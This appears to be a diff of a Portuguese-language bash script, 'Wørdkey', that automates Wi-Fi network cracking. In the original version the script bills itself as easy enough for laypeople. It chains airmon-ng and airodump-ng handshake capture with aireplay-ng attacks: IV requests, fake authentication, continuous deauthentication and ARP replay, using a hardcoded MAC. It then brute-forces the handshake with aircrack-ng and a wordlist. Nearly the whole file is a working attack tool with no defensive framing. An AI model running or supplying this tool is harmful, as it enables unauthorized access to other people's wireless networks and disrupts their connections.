@@ -1,60 +1,63 @@
 #!/bin/bash
-#Coder: Psychø
-#Coder: Agent-2k40
+#Coder: Psychøraptor; Agent-2k40
 
-#øøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøø
-#øøøøøøøø                 Wørdkey                øøøøøøøøøøøø
-#øøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøø
 
-#→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→
 Wordkey(){
-	echo "øøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøø       DarkBunny     «««««"
-	echo "→→→→→→→→→→→→→→→→→→→→→→→→→ Wørdkey ←←←←←←←←←←←←←←←←←←←←←←←←←"
-	echo "»»»»»    Psychør4ptør     øøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøø"
-
+	clear;
+	echo "============================================================"
+	echo "»»»»»»»»»»»»»»»»»»»»»»»»   WØRDK3Y   «««««««««««««««««««««««"
+	echo "============================================================"
 }
-#→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→
 Inicio(){
-	echo "Programa quebra wifi"
-	echo "Facil manuseio"
-	echo "util à leigos"
+	echo "------------------------------------------------------------"
+	echo " _ _ "
+	echo "(˘©˘) Uma boa quebra consiste em uma boa Wordlist!"
+	echo ""
+	echo '"DarkBunny, estamos sempre proximos."'
+	echo "------------------------------------------------------------"
 	echo ""
 	echo ""
-	echo "P4nd3møn↓um - Psychør4ptør"
+
+	echo "[!] Mantenha este terminal aberto"
 }
-#→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→
+Wordlist(){
+        export -f Wordkey;
+        export -f Pula;
+
+        Wordkey; Pula;
+
+        read -p "[+] Caminho da wordlist: " WORDLIST;
+	Pula;
+}
+Pack(){
+        read -p '[+] Caminho do arquivo "HandShake: "' PACK
+        Pula;
+	Limpa;
+}
 Tempo(){
-	read -p "Quanto tempo entre aberturas de terminais(seg): " TEMPO
+	read -p "[*] Quanto tempo entre aberturas de terminais(seg): " TEMPO;
 }
-#→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→
 Interface(){
-	read -p "[*] Qual interface usar » " PLACA;
+	read -p "[+] Qual interface usar » " PLACA;
 }
-#→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→
 Interface_mon(){
-	read -p "[*] Insira interface[mon] » " PLACA_MON;
+	read -p "[+] Insira interface[mon] » " PLACA_MON;
 }
-#→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→
 Interface_ok(){
-	read -p "[*] Interface gerada 'mon' [y ou n] » " REPLY;
+	read -p "[+] Interface gerada 'mon' [y ou n] » " REPLY;
 }
-#→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→
 Limpa(){
-	sleep 2 && clear;
+	clear;
 }
-#→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→
 Espera(){
-	sleep 5;
+	sleep 3;
 }
-#→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→
 Sair(){
-	sleep 5 && exit;
+	exit;
 }
-#→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→
 Pula(){
 	echo "";
 }
-#→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→
 Airmon_win(){
 	export -f Wordkey;
 	export -f Interface;
@@ -62,15 +65,14 @@ Airmon_win(){
 	export -f Espera;
 	export -f Pula;
 	export -f Sair;
-#	export -f Interface_ok;
-	gnome-terminal -x  bash -c 'Wordkey; Espera; Limpa; iwconfig; sleep 2; Interface; Limpa; echo "[*] Interface escolhida » $PLACA"; Pula; echo "[!] Preparando interface[mon]"; Pula; sudo airmon-ng start $placa; Limpa; iwconfig; Sair; exec bash'
+
+	gnome-terminal -x  bash -c 'Wordkey; Pula; iwconfig; Pula; Interface; Limpa; Wordkey; Pula; echo "[*] Interface escolhida »  $PLACA"; Pula; Pula; echo "[!] Preparando interface[mon]"; Pula; sudo airmon-ng start $PLACA; Limpa; Wordkey; Pula; iwconfig; sleep 1; Sair; exec bash'
 }
-#→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→
 Airmon(){
 	export -f Airmon_win;
+
 	Airmon_win;
 }
-#→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→
 Airodump_win(){
 	export -f Wordkey;
 	export -f Limpa;
@@ -78,51 +80,121 @@ Airodump_win(){
 	export -f Sair;
 	export -f Espera;
 	export -f Interface_mon;
-	gnome-terminal -x bash -c 'Wordkey; Espera; Limpa; echo "[!] Iniciando busca por redes"; Espera; Pula; iwconfig; Pula; Interface_mon; Pula; echo "[!] Preparando e iniciando busca por redes"; Pula; sudo airodump-ng $PLACA_MON; exec bash';
+
+	gnome-terminal -x bash -c 'Wordkey; Pula; echo "[!] Iniciando busca por redes"; Limpa; Wordkey; iwconfig; Pula; Interface_mon; Limpa; Wordkey; Pula; echo "[!] Preparando e iniciando busca por redes"; Pula; sudo airodump-ng $PLACA_MON; exec bash';
 }
-#→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→
 Airodump(){
 	export -f Airodump_win;
+
 	Airodump_win;
 }
-#→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→
 Alvo(){
 	export -f Espera;
 	export -f Limpa;
-	echo "[!] Alvo encontrado"; Espera; echo "[!] Informações de ataque deverão ser informadas"; Espera; Limpa; iwconfig; read -p "[*] Insira interface[mon] » " PLACA_MON; read -p "Insira BSSID » " BSSID; read -p "Insira ESSID » " ESSID; read -p "Insira CHANNEL » " CANAL;
+
+	echo "[!] Alvo encontrado"; Pula; echo "[!] Informações de ataque deverão ser informadas"; Limpa; iwconfig; Pula; read -p "[*] Insira interface[mon] » " PLACA_MON; Pula; read -p "Insira BSSID » " BSSID; read -p "Insira ESSID » " ESSID; read -p "Insira CHANNEL » " CANAL;
 }
-#→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→
 Alvo_airodump(){
 	export -f Wordkey;
 	export -f Alvo;
 	export -f Espera;
 	export -f Limpa;
 	export -f Pula;
-	gnome-terminal -x bash -c 'Wordkey; Alvo; Pula; echo "[!] Ataque de recolhimento"; Espera; Pula; echo "[ø] Iniciado"; Pula; sudo airodump-ng --bssid $BSSID --essid $ESSID --channel $CANAL --write $ESSID $PLACA_MON; exec bash'
+
+	export PLACA_MON;
+	export ESSID;
+	export BSSID;
+	export CANAL;
+
+	gnome-terminal -x bash -c 'Wordkey; Pula; echo "[!] Ataque de recolhimento"; Pula; echo "[!] Iniciando"; Pula; sudo airodump-ng --bssid $BSSID --essid $ESSID --channel $CANAL --write $ESSID $PLACA_MON; exec bash'
 }
-#→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→
-Alvo_aireplay(){
+Alvo_caffe(){
+	export -f Wordkey;
         export -f Alvo;
         export -f Espera;
         export -f Limpa;
         export -f Pula;
-        gnome-terminal -x bash -c 'Alvo; Pula; echo "[!] Ataque de pacotes"; Espera; Pula; echo "[ø] Iniciado"; sudo aireplay-ng -6 -b $BSSID -e $ESSID --ignore-negative-one $PLACA_MON; exec bash'
+
+	export PLACA_MON;
+	export ESSID;
+	export BSSID;
+	export CANAL;
+
+        gnome-terminal -x bash -c 'Wordkey; Pula; echo "[!] Ataque de requisição IVs"; Pula; echo "[+] Iniciando"; Pula; sudo aireplay-ng -6 -b $BSSID -e $ESSID -h 30:B5:C2:B8:19:D0 --ignore-negative-one $PLACA_MON; exec bash'
 }
+Alvo_fakeauth(){
+	export -f Wordkey;
+	export -f Espera;
+	export -f Limpa;
+        export -f Pula;
 
-#→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→
+        export PLACA_MON;
+        export ESSID;
+        export BSSID;
+        export CANAL;
 
+	gnome-terminal -x bash -c 'Wordkey; Pula; echo "[!] Ataque de falsa autenticação"; Pula; echo "[+] Iniciando"; Pula; sudo aireplay-ng -1 0 -q 4 -a $BSSID -e $ESSID -h 30:B5:C2:B8:19:D0 --ignore-negative-one $PLACA_MON; exec bash'
+}
+Alvo_ARP(){
+        export -f Wordkey;
+        export -f Espera;
+        export -f Limpa;
+        export -f Pula;
+
+        export PLACA_MON;
+        export ESSID;
+        export BSSID;
+        export CANAL;
+
+        gnome-terminal -x bash -c 'Wordkey; Pula; echo "[!] Ataque de Requisição ARP"; Pula; echo "[+] Iniciando"; Pula; sudo aireplay-ng -3 -a $BSSID -e $ESSID -h 30:B5:C2:B8:19:D0 --ignore-negative-one $PLACA_MON; exec bash'
+}
+Alvo_deauth(){
+	export -f Wordkey;
+        export -f Espera;
+        export -f Limpa;
+        export -f Pula;
+
+        export PLACA_MON;
+        export ESSID;
+        export BSSID;
+        export CANAL;
+
+        gnome-terminal -x bash -c 'Wordkey; Pula; echo "[!] Ataque de desautenticação"; Pula; echo "[!] Iniciando"; Pula; sudo aireplay-ng -0 0 -a $BSSID -e $ESSID --ignore-negative-one $PLACA_MON'
+}
+Alvo_crack(){
+	export -f Wordkey;
+	export -f Wordlist;
+	export -f Pack;
+	export -f Espera;
+	export -f Limpa;
+	export -f Pula;
+
+	gnome-terminal -x bash -c 'Wordkey; Pula; echo "[!] Aguarde o Handshake"; Pula; echo "[!] Apenas após a captura do Handshake de continuidade"; Wordlist; Pack; clear; Wordkey; Pula; echo "[!] Ataque de brute-force";  sudo aircrack-ng -w$WORDLIST $PACK; exec bash'
+}
 
 #øøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøø
 Wordkey
 Pula
 Inicio
 Pula
-TEMPO
+Tempo
 Airmon
 sleep $TEMPO
 Airodump
 sleep $TEMPO
+
+Pula
+Alvo
+
 Alvo_airodump
-sleep $TEMPO
-Alvo_aireplay
-#øøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøø
+sleep 10
+Alvo_caffe
+sleep 10
+Alvo_fakeauth
+sleep 10
+Alvo_deauth
+sleep 10
+Alvo_ARP
+sleep 10
+Alvo_crack
+#øøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøø
